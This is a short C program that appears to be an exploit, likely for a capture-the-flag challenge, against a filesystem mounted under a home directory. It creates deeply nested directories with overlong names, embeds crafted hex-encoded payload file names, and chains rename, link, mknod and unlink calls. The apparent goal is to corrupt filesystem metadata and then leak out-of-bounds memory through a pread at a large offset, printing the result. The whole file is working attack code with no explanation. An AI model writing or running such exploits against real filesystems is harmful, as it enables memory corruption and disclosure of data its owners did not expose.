

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

#define PATH_BASE "/home/quandale/mount"

char *repeat_char(char c, int l) {
    char *res = malloc(l);
    memset(res, c, l);
    return res;
}

int main() {

    char *payload0 = "\x49\x41\x64\x64\x42\x4C\x4E\x4A\x7F\x81\x7F\x7F\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46\x47\x47\x47\x47\x48\x48\x48\x48\x49\x49\x49\x49\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x4E\x07";

    char *tmp = malloc(0x1000);
    char *pmt = malloc(0x1000);
    sprintf(tmp, "%s/%s", PATH_BASE, repeat_char('A', 0x100));
    mkdir(tmp, 0755);

    sprintf(tmp, "%s/%s", tmp, repeat_char('B', 0x100-3));
    mkdir(tmp, 0755);

    sprintf(pmt, "%s/%s", tmp, "z");
    mkdir(pmt, 0755);

    sprintf(pmt, "%s/%s", pmt, repeat_char('C', 0x10));
    mkdir(pmt, 0755);

    sprintf(pmt, "%s/%s", tmp, "z");
    sprintf(pmt, "%s/%s", pmt, "aaaaaa"); 
    mknod(pmt, 0755, 0);

    sprintf(pmt, "%s/%s", tmp, "z");
    sprintf(tmp, "%s/%s", tmp, payload0);
    rename(pmt, tmp); 

    char *payload1 = "\x4E\x4A\x48\x54\x4F\x48";
    sprintf(pmt, "%s/%s", PATH_BASE, payload1);
    mknod(pmt, 0755, 0);
    sprintf(tmp, "%s/%s", PATH_BASE, "zxcvbn");
    link(pmt, tmp);

    sprintf(tmp, "%s/%s", PATH_BASE, repeat_char('A', 0x100));
    sprintf(tmp, "%s/%s", tmp, repeat_char('B', 0x100-3));
    sprintf(tmp, "%s/%s", tmp, payload0);
    sprintf(tmp, "%s/%s", tmp, "aaaaaa");
    puts("rename time");
    rename(tmp, pmt); 

    char *payload2 = "\x70\x41\x45\x4C\x57\x54\x4A\x57\x46\x46\x42";

    sprintf(tmp, "%s/%s", PATH_BASE, "aaaaaa");
    mknod(tmp, 0755, 0);
    sprintf(tmp, "%s/%s", PATH_BASE, "a");
    mknod(tmp, 0755, 0);
    sprintf(tmp, "%s/%s", PATH_BASE, payload2);
    mknod(tmp, 0755, 0);
    sprintf(tmp, "%s/%s", PATH_BASE, "a");
    unlink(tmp);
    sprintf(tmp, "%s/%s", PATH_BASE, "zzz");
    mknod(tmp, 0755, 0);
    unlink(tmp);
    sprintf(tmp, "%s/%s", PATH_BASE, "zz");
    mknod(tmp, 0755, 0);

    sprintf(tmp, "%s/%s", PATH_BASE, payload2+1);
    printf("%s\n", tmp);

    read(0, pmt, 4);

    int fd = open(tmp, O_RDONLY);
    if(fd < 0) {
        perror("open");
        exit(1);
    }
    int res = pread(fd, pmt, 0x100, 0xffa8);
    if(res < 0) {
        perror("pread");
        exit(1);
    }
    printf("%d\n", res);
    write(1, pmt, 0x100);

    return 0;
}

